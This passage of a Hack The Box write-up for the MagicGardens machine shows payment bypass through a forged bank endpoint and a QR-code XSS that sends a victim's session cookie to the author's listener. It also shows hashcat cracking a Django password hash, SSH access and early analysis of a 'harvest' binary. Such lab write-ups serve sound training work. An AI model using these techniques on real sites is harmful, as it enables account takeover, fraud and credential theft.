class="number">0</span>s         <span class="number">0</span>/<span class="number">30000</span>   <span class="number">0</span>/s     http://magicgardens.htb/profile/</span><br></pre></td></tr></table></figure></div>

<p>We have 2 seperate login portals: One under <code>http://magicgardens</code> and one under <code>http://magicgardens.htb/admin</code> </p>
<h3 id="Web-Application-http-magicgardens-htb"><a href="#Web-Application-http-magicgardens-htb" class="headerlink" title="Web Application - http://magicgardens.htb"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://magicgardens.htb/" >http://magicgardens.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/MagicGardens/web.png"
                      alt="Web Application"
                ><figcaption>Web Application</figcaption></figure></p>
<p>We can simply go ahead and create an account for ourselves:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/MagicGardens/web1.png"
                      alt="Web Application"
                ><figcaption>Web Application</figcaption></figure></p>
<p>Looking at some of the features related to our account, we can upgrade our account to become a premium one:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/MagicGardens/web2.png"
                      alt="Web Application"
                ><figcaption>Web Application</figcaption></figure></p>
<p>Now we‚Äôd have to be choosing our bank and entering our data:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/MagicGardens/web3.png"
                      alt="Web Application"
                ><figcaption>Web Application</figcaption></figure></p>
<p>What I‚Äôll do now is interecpt the request being sent and see what we have on our hands:</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/subscribe/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>magicgardens.htb</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>186</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://magicgardens.htb</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Sec-GPC</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://magicgardens.htb/profile/?tab=subscription&amp;action=upgrade</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>csrftoken=sAhvqc8HoIxuKSPHwLDwKxUDJJl0mBEf; sessionid=.eJxFyTEKgDAMQFGXioUexMnLeAAJtlCtVmgSnAQPkDHeV9HBvz3-aa5UfR3aSsMYSoY1qJjEc8gqNRIQo0rTE2QPxavYfcI4LBOSSqXiXo4bZwpFYy12hELff-Re_Zu7G852LCE:1tgfE0:coGRcCNwNZvcyW9Sb52AMHvk6PcgoDVP99GWSmSmt8U</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">csrfmiddlewaretoken</span>=nSe8s8pfkR5MeSnqTtPCDPiOfqzTFFU5FiltIanMyps6OA2Xf4iYdc2hOZKJR6oa&amp;bank=honestbank.htb&amp;cardname=kujen&amp;cardnumber=<span class="number">1111</span>-<span class="number">2222</span>-<span class="number">3333</span>-<span class="number">4444</span>&amp;expmonth=april&amp;expyear=<span class="number">2026</span>&amp;cvv=<span class="number">352</span></span></span><br></pre></td></tr></table></figure></div>

<p>So we‚Äôll be making a request where the <code>bank</code> field has the value <code>honestbank.htb</code>, let‚Äôs try to change that to our local address and see what sort of requests we‚Äôre getting:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; python3 <span class="literal">-m</span> http.server <span class="number">80</span></span><br><span class="line">Serving HTTP on :: port <span class="number">80</span> (http://[::]:<span class="number">80</span>/) ...</span><br><span class="line">::ffff:<span class="number">10.129</span>.<span class="number">41.157</span> - - [<span class="number">08</span>/<span class="type">Feb</span>/<span class="number">2025</span> <span class="number">08</span>:<span class="number">20</span>:<span class="number">45</span>] code <span class="number">501</span>, message Unsupported method (<span class="string">&#x27;POST&#x27;</span>)</span><br><span class="line">::ffff:<span class="number">10.129</span>.<span class="number">41.157</span> - - [<span class="number">08</span>/<span class="type">Feb</span>/<span class="number">2025</span> <span class="number">08</span>:<span class="number">20</span>:<span class="number">45</span>] <span class="string">&quot;POST /api/payments/ HTTP/1.1&quot;</span> <span class="number">501</span> -</span><br></pre></td></tr></table></figure></div>

<p>Well this is interesting: the server is making a request to the bank we chose <code>honestbank.htb</code> (which we now changed to our own local server) to specifically a <code>/api/payments</code> endpoint. One more thing to add, is that the result of our request is this:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/MagicGardens/web4.png"
                      alt="Web Application"
                ><figcaption>Web Application</figcaption></figure></p>
<p>And after waiting for a few seconds, we get a rejection:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/MagicGardens/web5.png"
                      alt="Web Application"
                ><figcaption>Web Application</figcaption></figure></p>
<p>So I will create a local web server with a <code>/api/payments</code> endpoint and see whats going on:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/payments/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sleepisgood</span>():</span><br><span class="line">    req_json = request.get_json()</span><br><span class="line">    req_json[<span class="string">&#x27;status&#x27;</span>] = <span class="string">&quot;200&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(req_json)</span><br><span class="line">    <span class="keyword">return</span> jsonify(req_json)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></div>

<p>And we got it! Alongside the json data that‚Äôs being passed:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; python3 .\server.py</span><br><span class="line"> * Serving Flask app <span class="string">&#x27;server&#x27;</span></span><br><span class="line"> * Debug mode: on</span><br><span class="line">WARNING: This is a development server. <span class="keyword">Do</span> not use it <span class="keyword">in</span> a production deployment. Use a production WSGI server instead.</span><br><span class="line"> * Running on all addresses (<span class="number">0.0</span>.<span class="number">0.0</span>)</span><br><span class="line"> * Running on http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">80</span></span><br><span class="line"> * Running on http://<span class="number">192.168</span>.<span class="number">1.21</span>:<span class="number">80</span></span><br><span class="line">Press CTRL+C to quit</span><br><span class="line"> * Restarting with stat</span><br><span class="line"> * Debugger is active!</span><br><span class="line"> * Debugger PIN: <span class="number">119</span><span class="literal">-575-313</span></span><br><span class="line">&#123;<span class="string">&#x27;cardname&#x27;</span>: <span class="string">&#x27;kujen&#x27;</span>, <span class="string">&#x27;cardnumber&#x27;</span>: <span class="string">&#x27;1111-2222-3333-4444&#x27;</span>, <span class="string">&#x27;expmonth&#x27;</span>: <span class="string">&#x27;april&#x27;</span>, <span class="string">&#x27;expyear&#x27;</span>: <span class="string">&#x27;2026&#x27;</span>, <span class="string">&#x27;cvv&#x27;</span>: <span class="string">&#x27;352&#x27;</span>, <span class="string">&#x27;amount&#x27;</span>: <span class="number">25</span>, <span class="string">&#x27;status&#x27;</span>: <span class="string">&#x27;200&#x27;</span>&#125;</span><br><span class="line"><span class="number">10.129</span>.<span class="number">41.157</span> - - [<span class="number">08</span>/<span class="type">Feb</span>/<span class="number">2025</span> <span class="number">08</span>:<span class="number">27</span>:<span class="number">38</span>] <span class="string">&quot;POST /api/payments/ HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br></pre></td></tr></table></figure></div>

<p>And now after validating our poyment method, we have become a premium member:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/MagicGardens/web6.png"
                      alt="Web Application"
                ><figcaption>Web Application</figcaption></figure></p>
<p>Now let‚Äôs process that QR code and see what it has:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/MagicGardens/qr.png"
                      alt="QR Code"
                ><figcaption>QR Code</figcaption></figure></p>
<p>Seems like some sort of ID for us.</p>
<p>Now what we can do is go ahead and buy something from the store, we get this:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/MagicGardens/web7.png"
                      alt="Web Application"
                ><figcaption>Web Application</figcaption></figure></p>
<p>And after a few seconds I get an email for Morty:</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/MagicGardens/web8.png"
                      alt="Web Application"
                ><figcaption>Web Application</figcaption></figure></p>
<p>This seems like a phishing attacks that‚Äôll lead us to perform an XSS and get Morty‚Äôs access.<br>So I‚Äôll be crafting a QR code based off of the previous QR code result:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/MagicGardens/qr1.png"
                      alt="QR Code"
                ><figcaption>QR Code</figcaption></figure></p>
<p>Now I‚Äôll send it to Morty and just wait:</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/MagicGardens/web9.png"
                      alt="Web Application"
                ><figcaption>Web Application</figcaption></figure></p>
<p>And we get a hit!</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; python3 <span class="literal">-m</span> http.server <span class="number">80</span></span><br><span class="line">Serving HTTP on :: port <span class="number">80</span> (http://[::]:<span class="number">80</span>/) ...</span><br><span class="line">::ffff:<span class="number">10.129</span>.<span class="number">231.24</span> - - [<span class="number">08</span>/<span class="type">Feb</span>/<span class="number">2025</span> <span class="number">09</span>:<span class="number">05</span>:<span class="number">21</span>] <span class="string">&quot;GET /?Y3NyZnRva2VuPUtubVBoTXJWdGpEcnlxenlPRUpNMlZmZjVhelh2MGhYOyBzZXNzaW9uaWQ9LmVKeE5qVTFxd3pBUWhaTkZRZ01waFp5aTNRaExsdU5vVjdydnFnY3draXhGYmhNSjlFUHBvdEFEekhKNjN6cHVBcDdkOTc3SG01X1Y3MjY1bU80YkgtR3VKQk85UEJ1RTFUbkVfSVd3VGxubWtzYmdMVXRyRVRhZlEzTGRhVWdaWVlHd25WQ0g0ck9KNk5hdzBUTG1mel9TZHFLWnZ1OWt5YTY3UE9xR0htSEpFSGF6VEVuOVlmd29udnAzNlktQjZPQnpIQlM1Vk1qVkp2SWFlbk42dVhVZlpnTk9Kb2Z3VEJ0dG1XMEZyVTNWY0diTWdXbFJLY1dwdElJeTJSeXFmYTF0MC1vOVZZcXB5ckNhRzA2MWFtdXVoY0JDX2dEZXMyWDc6MXRnZnhiOm95dGZKVlNmY3BmVmxZWkFOYU1hTGoxdDRveVVIVnpQeDRRTEV1Y0lDZE0= HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br></pre></td></tr></table></figure></div>
<p>This decodes to:</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">csrftoken=KnmPhMrVtjDryqzyOEJM2Vff5azXv0hX; </span><br><span class="line">sessionid=.eJxNjU1qwzAQhZNFQgMphZyi3QhLluNoV7rvqgcwkixFbhMJ9EPpotADzHJ63zpuAp7d977Hm5_V7265mO4bH-GuJBO9PBuE1TnE_IWwTlnmksbgLUtrETafQ3LdaUgZYYGwnVCH4rOJ6Naw0TLmfz_SdqKZvu9kya67POqGHmHJEHazTEn9Yfwonvp36Y-B6OBzHBS5VMjVJvIaenN6uXUfZgNOJofwTBttmW0FrU3VcGbMgWlRKcWptIIy2Ryqfa1t0-o9VYqpyrCaG061amuuhcBC_gDes2X7:1tgfxb:oytfJVSfcpfVlYZANaMaLj1t4oyUHVzPx4QLEucICdM</span><br></pre></td></tr></table></figure></div>

<p>Let‚Äôs get into morty‚Äôs account now:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/MagicGardens/web10.png"
                      alt="Web Application"
                ><figcaption>Web Application</figcaption></figure></p>
<p>And we‚Äôre in!!</p>
<h3 id="Web-Application-http-magicgardens-htb-admin"><a href="#Web-Application-http-magicgardens-htb-admin" class="headerlink" title="Web Application - http://magicgardens.htb/admin"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://magicgardens.htb/admin" >http://magicgardens.htb/admin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p>Remember that admin panel from our initial recon? Let‚Äôs get into it now:</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/MagicGardens/web11.png"
                      alt="Admin Panel"
                ><figcaption>Admin Panel</figcaption></figure></p>
<p>This is a Django administration website.</p>
<p>Looking at our stored users, and especially Morty we find something interesting:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/MagicGardens/web12.png"
                      alt="Admin Panel"
                ><figcaption>Admin Panel</figcaption></figure></p>
<p>It‚Äôs a password hash for morty, let‚Äôs crack it!</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop]</span><br><span class="line">‚îî‚îÄ$ hashcat -m 10000 -a 0 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br><span class="line">hashcat (v6.2.6) starting</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="comment">#1 [The pocl project]</span></span><br><span class="line">============================================================================================================================================</span><br><span class="line">* Device <span class="comment">#1: cpu-sandybridge-AMD Ryzen 7 4800H with Radeon Graphics, 2212/4489 MB (1024 MB allocatable), 4MCU</span></span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line">* Slow-Hash-SIMD-LOOP</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Host memory required <span class="keyword">for</span> this attack: 1 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344385</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line"></span><br><span class="line">Cracking performance lower than expected?                 </span><br><span class="line"></span><br><span class="line">* Append -w 3 to the commandline.</span><br><span class="line">  This can cause your screen to lag.</span><br><span class="line"></span><br><span class="line">* Append -S to the commandline.</span><br><span class="line">  This has a drastic speed impact but can be better <span class="keyword">for</span> specific attacks.</span><br><span class="line">  Typical scenarios are a small wordlist but a large ruleset.</span><br><span class="line"></span><br><span class="line">* Update your backend API runtime / driver the right way:</span><br><span class="line">  https://hashcat.net/faq/wrongdriver</span><br><span class="line"></span><br><span class="line">* Create more work items to make use of your parallelization power:</span><br><span class="line">  https://hashcat.net/faq/morework</span><br><span class="line"></span><br><span class="line">pbkdf2_sha256$600000$y7K056G3KxbaRc40ioQE8j<span class="variable">$e7bq8dE</span>/U+yIiZ8isA0Dc0wuL0gYI3GjmmdzNU+Nl7I=:jonasbrothers</span><br><span class="line">                                                          </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 10000 (Django (PBKDF2-SHA256))</span><br><span class="line">Hash.Target......: pbkdf2_sha256$600000$y7K056G3KxbaRc40ioQE8j<span class="variable">$e7bq8dE</span>...+Nl7I=</span><br><span class="line">Time.Started.....: Sat Feb  8 09:13:51 2025 (1 min, 25 secs)</span><br><span class="line">Time.Estimated...: Sat Feb  8 09:15:16 2025 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........:       26 H/s (7.92ms) @ Accel:32 Loops:1024 Thr:1 Vec:8</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)</span><br><span class="line">Progress.........: 2176/14344385 (0.02%)</span><br><span class="line">Rejected.........: 0/2176 (0.00%)</span><br><span class="line">Restore.Point....: 2048/14344385 (0.01%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:599040-599999</span></span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.<span class="comment">#1....: slimshady -&gt; telefon</span></span><br><span class="line">Hardware.Mon.<span class="comment">#1..: Util: 92%</span></span><br><span class="line"></span><br><span class="line">Started: Sat Feb  8 09:13:50 2025</span><br><span class="line">Stopped: Sat Feb  8 09:15:17 2025</span><br></pre></td></tr></table></figure></div>

<p>And we get our password:<br><code>pbkdf2_sha256$600000$y7K056G3KxbaRc40ioQE8j$e7bq8dE/U+yIiZ8isA0Dc0wuL0gYI3GjmmdzNU+Nl7I=:jonasbrothers</code></p>
<p>Let‚Äôs get an ssh session as morty now:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">morty@magicgardens:~$ <span class="built_in">id</span></span><br><span class="line">uid=1001(morty) gid=1001(morty) <span class="built_in">groups</span>=1001(morty)</span><br><span class="line">morty@magicgardens:~$</span><br></pre></td></tr></table></figure></div>

<p>Looking at running processes, we find an interesting process used by <code>alex</code>:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alex        1836  0.0  0.0   2464   884 ?        S    02:45   0:00 harvest server -l /home/alex/.harvest_logs</span><br></pre></td></tr></table></figure></div>

<p>We can find the binary on the system:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">morty@magicgardens:~$ find / -name harvest 2&gt; /dev/null</span><br><span class="line">/usr/local/bin/harvest</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">morty@magicgardens:~$ harvest</span><br><span class="line"></span><br><span class="line"> ‚ñà‚ñà‚ñë ‚ñà‚ñà  ‚ñÑ‚ñÑ‚ñÑ       ‚ñà‚ñà‚ñÄ‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñí   ‚ñà‚ñì‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì</span><br><span class="line">‚ñì‚ñà‚ñà‚ñë ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà‚ñÑ    ‚ñì‚ñà‚ñà ‚ñí ‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà‚ñë   ‚ñà‚ñí‚ñì‚ñà   ‚ñÄ ‚ñí‚ñà‚ñà    ‚ñí ‚ñì  ‚ñà‚ñà‚ñí ‚ñì‚ñí</span><br><span class="line">‚ñí‚ñà‚ñà‚ñÄ‚ñÄ‚ñà‚ñà‚ñë‚ñí‚ñà‚ñà  ‚ñÄ‚ñà‚ñÑ  ‚ñì‚ñà‚ñà ‚ñë‚ñÑ‚ñà ‚ñí ‚ñì‚ñà‚ñà  ‚ñà‚ñí‚ñë‚ñí‚ñà‚ñà‚ñà   ‚ñë ‚ñì‚ñà‚ñà‚ñÑ   ‚ñí ‚ñì‚ñà‚ñà‚ñë ‚ñí‚ñë</span><br><span class="line">‚ñë‚ñì‚ñà ‚ñë‚ñà‚ñà ‚ñë‚ñà‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà ‚ñí‚ñà‚ñà‚ñÄ‚ñÄ‚ñà‚ñÑ    ‚ñí‚ñà‚ñà ‚ñà‚ñë‚ñë‚ñí‚ñì‚ñà  ‚ñÑ   ‚ñí   ‚ñà‚ñà‚ñí‚ñë ‚ñì‚ñà‚ñà‚ñì ‚ñë</span><br><span class="line">‚ñë‚ñì‚ñà‚ñí‚ñë‚ñà‚ñà‚ñì ‚ñì‚ñà   ‚ñì‚ñà‚ñà‚ñí‚ñë‚ñà‚ñà‚ñì ‚ñí‚ñà‚ñà‚ñí   ‚ñí‚ñÄ‚ñà‚ñë  ‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí  ‚ñí‚ñà‚ñà‚ñí ‚ñë</span><br><span class="line"> ‚ñí ‚ñë‚ñë‚ñí‚ñë‚ñí ‚ñí‚ñí   ‚ñì‚ñí‚ñà‚ñë‚ñë ‚ñí‚ñì ‚ñë‚ñí‚ñì‚ñë   ‚ñë ‚ñê‚ñë  ‚ñë‚ñë ‚ñí‚ñë ‚ñë‚ñí ‚ñí‚ñì‚ñí ‚ñí ‚ñë  ‚ñí ‚ñë‚ñë</span><br><span class="line"> ‚ñí ‚ñë‚ñí‚ñë ‚ñë  ‚ñí   ‚ñí‚ñí ‚ñë  ‚ñë‚ñí ‚ñë ‚ñí‚ñë   ‚ñë ‚ñë‚ñë   ‚ñë ‚ñë  ‚ñë‚ñë ‚ñë‚ñí  ‚ñë ‚ñë    ‚ñë</span><br><span class="line"> ‚ñë  ‚ñë‚ñë ‚ñë  ‚ñë   ‚ñí     ‚ñë‚ñë   ‚ñë      ‚ñë‚ñë     ‚ñë   ‚ñë  ‚ñë  ‚ñë    ‚ñë</span><br><span class="line"> ‚ñë  ‚ñë  ‚ñë      ‚ñë  ‚ñë   ‚ñë           ‚ñë     ‚ñë  ‚ñë      ‚ñë</span><br><span class="line">                                ‚ñë</span><br><span class="line"></span><br><span class="line">harvest v1.0.3 - Remote network analyzer</span><br><span class="line"></span><br><span class="line">Usage: harvest &lt;<span class="built_in">command</span>&gt; [options...]</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">    server          run harvest <span class="keyword">in</span> server mode</span><br><span class="line">    client          run harvest <span class="keyword">in</span> client mode</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">    -h              show this message</span><br><span class="line">    -l &lt;file&gt;       <span class="built_in">log</span> file</span><br><span class="line">    -i &lt;interface&gt;  capture packets on this interface</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">    harvest server -i eth0</span><br><span class="line">    harvest client 10.10.15.212</span><br><span class="line"></span><br><span class="line">Please, define mode</span><br><span class="line"></span><br><span class="line">morty@magicgardens:~$</span><br></pre></td></tr></table></figure></div>

<p>I‚Äôll download the binary to my system and have a look at it.<br>Firstly from what I understood, harvest runs as a network packet capture server on the specified network interface and the client connects to harvest server to relay some sort of network data.</p>
<p>First I‚Äôll be taking a look at the handshake that‚Äôs happening between the server and the client:</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/MagicGardens/harvest.png"
                      alt="Harvest"
                ><figcaption>Harvest</figcaption></figure></p>
<p>At first, the handshake will be compared. If it‚Äôs correct, the monitoring will start.<br>However, the handshake starts with <code>harvest v</code>, and there are some numbers or letter after it:</p>
